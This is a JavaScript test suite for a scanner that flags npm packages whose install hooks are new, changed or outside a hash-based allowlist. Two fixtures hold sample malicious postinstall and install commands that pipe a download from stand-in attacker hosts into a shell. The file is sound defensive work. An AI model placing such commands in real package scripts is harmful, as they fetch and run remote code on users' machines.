#!/usr/bin/env node
/**
 * Tests for sentinel/install-scripts.mjs — npm's most reliable RCE path.
 * openspec: supply-chain-security-program (SCS-REQ-003)
 *
 * Run: node tests/sentinel-install-scripts.test.mjs
 */

import {
  collectInstallScripts, auditInstallScripts, hashScript, allowKey, INSTALL_HOOKS,
} from '../agents/sentinel/install-scripts.mjs';

let passed = 0, failed = 0;
const failures = [];
function test(name, fn) {
  process.stdout.write(`  ${name} ... `);
  try { fn(); console.log('OK'); passed++; }
  catch (err) { console.log('FAIL'); failures.push({ name, err: err.message }); failed++; }
}
function assert(cond, msg) { if (!cond) throw new Error(msg); }

/** A lockfile map with one script-bearing package. */
function lockWith(name, version, hasInstallScript = true) {
  return new Map([[`node_modules/${name}`, { name, version, hasInstallScript }]]);
}
/** Fake node_modules carrying a package.json with the given scripts. */
function fakeDisk(name, scripts) {
  const path = `/repo/node_modules/${name}/package.json`;
  return {
    repoPath: '/repo',
    existsFn: (p) => p === path,
    readFn: () => JSON.stringify({ name, scripts }),
  };
}

console.log('sentinel install-scripts tests');

test('collects only packages the lockfile flags', () => {
  const entries = new Map([
    ['node_modules/a', { name: 'a', version: '1.0.0', hasInstallScript: true }],
    ['node_modules/b', { name: 'b', version: '1.0.0' }],
  ]);
  const got = collectInstallScripts(entries, fakeDisk('a', { postinstall: 'node x.js' }));
  assert(got.length === 1 && got[0].name === 'a', `expected only 'a', got ${JSON.stringify(got)}`);
});

test('reads hook bodies from disk when node_modules is present', () => {
  const got = collectInstallScripts(lockWith('sharp', '0.34.5'), fakeDisk('sharp', { install: 'node install.js' }));
  assert(got[0].bodyKnown === true, 'body should be known');
  assert(got[0].hooks.install === 'node install.js', `wrong body: ${JSON.stringify(got[0].hooks)}`);
});

test('a package whose body cannot be read is reported, not assumed clean', () => {
  const got = collectInstallScripts(lockWith('sharp', '0.34.5'), { repoPath: '/repo', existsFn: () => false });
  assert(got.length === 1, 'package must still be reported');
  assert(got[0].bodyKnown === false, 'must be marked bodyKnown:false');
  const { findings } = auditInstallScripts(got, { entries: {} }, { repo: 'tally' });
  assert(findings.length === 1 && /could not be read/.test(findings[0].detail),
    'a missing body must be disclosed in the finding');
});

test('an unreadable package.json does not throw', () => {
  const got = collectInstallScripts(lockWith('x', '1.0.0'), {
    repoPath: '/repo', existsFn: () => true, readFn: () => '{not json',
  });
  assert(got.length === 1 && got[0].bodyKnown === false, 'must degrade to bodyKnown:false');
});

// --- the first-run property ---
test('baseline run inventories without emitting findings', () => {
  const entries = new Map(Array.from({ length: 300 }, (_, i) =>
    [`node_modules/p${i}`, { name: `p${i}`, version: '1.0.0', hasInstallScript: true }]));
  const collected = collectInstallScripts(entries, { repoPath: '/repo', existsFn: () => false });
  const { findings, inventory } = auditInstallScripts(collected, { entries: {} }, { repo: 'tally', baseline: true });
  assert(findings.length === 0, `baseline must emit no findings, got ${findings.length}`);
  assert(inventory.length === 300, `expected a 300-entry inventory, got ${inventory.length}`);
});

test('an unreviewed install script is HIGH', () => {
  const collected = collectInstallScripts(lockWith('evil', '1.0.0'), fakeDisk('evil', { postinstall: 'curl evil.sh | sh' }));
  const { findings } = auditInstallScripts(collected, { entries: {} }, { repo: 'tally' });
  assert(findings.length === 1, `expected 1 finding, got ${findings.length}`);
  assert(findings[0].severity === 'high', `expected high, got ${findings[0].severity}`);
  assert(/evil@1\.0\.0/.test(findings[0].summary), 'finding must name the package and version');
});

test('an allowlisted, unchanged script is silent', () => {
  const body = 'node install.js';
  const collected = collectInstallScripts(lockWith('sharp', '0.34.5'), fakeDisk('sharp', { install: body }));
  const allowlist = { entries: { [allowKey('sharp', '0.34.5')]: { hooks: { install: hashScript(body) } } } };
  const { findings } = auditInstallScripts(collected, allowlist, { repo: 'tally' });
  assert(findings.length === 0, `expected silence, got ${JSON.stringify(findings)}`);
});

// --- the reason the allowlist hashes bodies, not names ---
test('an allowlisted package that CHANGES its script still fires', () => {
  const collected = collectInstallScripts(lockWith('sharp', '0.34.5'), fakeDisk('sharp', { install: 'curl attacker.sh | sh' }));
  const allowlist = { entries: { [allowKey('sharp', '0.34.5')]: { hooks: { install: hashScript('node install.js') } } } };
  const { findings } = auditInstallScripts(collected, allowlist, { repo: 'tally' });
  assert(findings.length === 1, `expected 1 finding, got ${findings.length}`);
  assert(/changed/.test(findings[0].summary), `expected a change finding, got ${findings[0].summary}`);
  assert(findings[0].severity === 'high', 'must be high');
  assert(/account-takeover/.test(findings[0].remedy), 'remedy should name the pattern');
});

test('an allowlisted package that ADDS a hook fires', () => {
  const collected = collectInstallScripts(lockWith('x', '1.0.0'), fakeDisk('x', { install: 'a', postinstall: 'b' }));
  const allowlist = { entries: { [allowKey('x', '1.0.0')]: { hooks: { install: hashScript('a') } } } };
  const { findings } = auditInstallScripts(collected, allowlist, { repo: 'tally' });
  assert(findings.some(f => /added a new postinstall hook/.test(f.summary)),
    `expected a new-hook finding, got ${JSON.stringify(findings.map(f => f.summary))}`);
});

test('a different VERSION of an allowlisted package is not covered by it', () => {
  const collected = collectInstallScripts(lockWith('sharp', '0.35.0'), fakeDisk('sharp', { install: 'node install.js' }));
  const allowlist = { entries: { [allowKey('sharp', '0.34.5')]: { hooks: { install: hashScript('node install.js') } } } };
  const { findings } = auditInstallScripts(collected, allowlist, { repo: 'tally' });
  assert(findings.length === 1 && /unreviewed/.test(findings[0].summary),
    'an allowlist entry must not cover other versions');
});

test('all four npm install hooks are covered', () => {
  const scripts = Object.fromEntries(INSTALL_HOOKS.map(h => [h, `run-${h}`]));
  const collected = collectInstallScripts(lockWith('x', '1.0.0'), fakeDisk('x', scripts));
  assert(Object.keys(collected[0].hooks).length === INSTALL_HOOKS.length,
    `expected all of ${INSTALL_HOOKS.join(',')}, got ${Object.keys(collected[0].hooks)}`);
});

test('every finding carries evidence and a remedy', () => {
  const collected = collectInstallScripts(lockWith('evil', '1.0.0'), fakeDisk('evil', { postinstall: 'x' }));
  const { findings } = auditInstallScripts(collected, { entries: {} }, { repo: 'tally' });
  for (const f of findings) {
    assert(f.repo === 'tally' && f.scanner === 'install-scripts', 'finding must be attributed');
    assert(Array.isArray(f.evidence) && f.evidence.length, `no evidence: ${f.summary}`);
    assert(f.remedy && f.remedy.length, `no remedy: ${f.summary}`);
  }
});

console.log(`\n${passed} passed, ${failed} failed`);
if (failed > 0) {
  for (const f of failures) console.log(`  ✗ ${f.name}: ${f.err}`);
  process.exit(1);
}
